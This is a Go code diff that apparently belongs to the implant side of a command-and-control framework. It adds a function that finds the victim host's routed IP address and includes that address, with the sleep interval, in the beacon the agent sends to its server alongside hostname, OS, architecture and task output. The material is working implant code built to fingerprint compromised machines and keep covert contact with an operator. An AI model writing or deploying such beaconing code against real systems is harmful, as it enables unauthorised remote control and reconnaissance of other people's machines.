@@ -4,6 +4,8 @@ import (
 	"errors"
 	"log"
 	"math/rand"
+	"net"
+	"net/url"
 	"os"
 	"runtime"
 	"strconv"
@@ -41,6 +43,7 @@ var (
 // Run starts the beacon loop. It blocks until a kill task is received or the process exits.
 func Run(cfg *Config) {
 	client := newPinnedClient(cfg.CertFingerprint)
+	hostIP := routedHostIP(cfg.ServerURL)
 	var pendingResults []*protocol.TaskResult
 	consecutiveFailures := 0
 	var lastFailureLog time.Time
@@ -78,13 +81,15 @@ func Run(cfg *Config) {
 			pendingResult = pendingResults[0]
 		}
 		beacon := &protocol.Beacon{
-			AgentID:    cfg.AgentID,
-			Timestamp:  time.Now().Unix(),
-			Nonce:      nonce,
-			Hostname:   hostname(),
-			OS:         runtime.GOOS,
-			Arch:       runtime.GOARCH,
-			TaskOutput: pendingResult,
+			AgentID:      cfg.AgentID,
+			Timestamp:    time.Now().Unix(),
+			Nonce:        nonce,
+			Hostname:     hostname(),
+			OS:           runtime.GOOS,
+			Arch:         runtime.GOARCH,
+			HostIP:       hostIP,
+			SleepSeconds: cfg.SleepSeconds,
+			TaskOutput:   pendingResult,
 		}
 
 		encoded, err := protocol.EncodeBeacon(beacon, cfg.Secret)
@@ -248,6 +253,31 @@ func queueAsyncTypedProgress(taskID, resultType, label, message string) {
 func hostname() string {
 	h, _ := os.Hostname()
 	return h
+}
+
+// routedHostIP reports the local interface address the operating system would
+// use to reach the configured server. A UDP dial selects the route without
+// sending traffic and avoids reporting the server's callback address as the
+// agent host address.
+func routedHostIP(serverURL string) string {
+	u, err := url.Parse(serverURL)
+	if err != nil || u.Hostname() == "" {
+		return ""
+	}
+	port := u.Port()
+	if port == "" {
+		port = "443"
+	}
+	conn, err := net.DialTimeout("udp", net.JoinHostPort(u.Hostname(), port), time.Second)
+	if err != nil {
+		return ""
+	}
+	defer conn.Close()
+	addr, ok := conn.LocalAddr().(*net.UDPAddr)
+	if !ok || addr.IP == nil || addr.IP.IsUnspecified() {
+		return ""
+	}
+	return addr.IP.String()
 }
 
 func fastBeaconActive() bool {
